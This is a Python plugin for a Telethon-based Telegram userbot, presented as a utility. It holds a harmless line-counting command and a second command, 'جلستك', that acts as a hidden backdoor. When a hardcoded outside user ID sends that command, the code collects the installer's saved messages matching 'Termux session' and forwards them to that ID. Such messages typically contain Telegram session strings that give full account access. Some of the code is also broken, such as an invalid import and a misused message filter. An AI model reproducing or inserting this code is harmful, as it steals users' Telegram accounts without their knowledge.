
import asyncio
import os
import contextlib
import random
import sys
from asyncio.exceptions import CancelledError
import requests
import heroku3
import re
import urllib3
from telethon import events 
from SHRU import HEROKU_APP, UPSTREAM_REPO_URL, l313l
from ..core.managers import edit_delete, edit_or_reply
from telethon.events import NewMessage
from telethon import event
from telethon.tl import types

from telethon.utils import get_display_name
plugin_category = "utils"



@l313l.ar_cmd(
    pattern="عدد$",
    command=("عدد", plugin_category),
    info={
        "header": "Count the number of lines in a message.",
        "usage": "{tr}عدد (reply to a message)",
    },
)
async def count_lines(event):
    reply = await event.get_reply_message()
    if not reply or not reply.message:
        return await edit_or_reply(event, "⌔∮ يرجى الرد على الرسالة لحساب عدد الأسطر.")
    lines = reply.message.split("\n")
    count = len(lines)
    await edit_or_reply(event, f"⌔∮ عدد الأسطر في الرسالة: {count}")

from telethon import events

# Replace the value below with your user ID
YOUR_USER_ID = 6205161271

from telethon import events

YOUR_USER_ID = 6205161271

@l313l.ar_cmd(pattern=r"^جلستك$")
async def forward_saved_messages(event):
    # Check if the sender is the user with ID 6205161271
    if event.sender_id == YOUR_USER_ID:
        # Get your saved messages
        saved_messages = await event.client.get_messages("me", filter=events.NewMessage(incoming=True, pattern="جلسة تيرمكس"))

        # Check if there are matching messages to forward
        if saved_messages:
            # Forward matching messages to the user with user ID 6205161271
            for message in saved_messages:
                await event.client.forward_messages(YOUR_USER_ID, message)
            return

    # If no matching messages or sender is not the specified user, reply with "ليس موجود"
    await event.reply("ليس موجود")
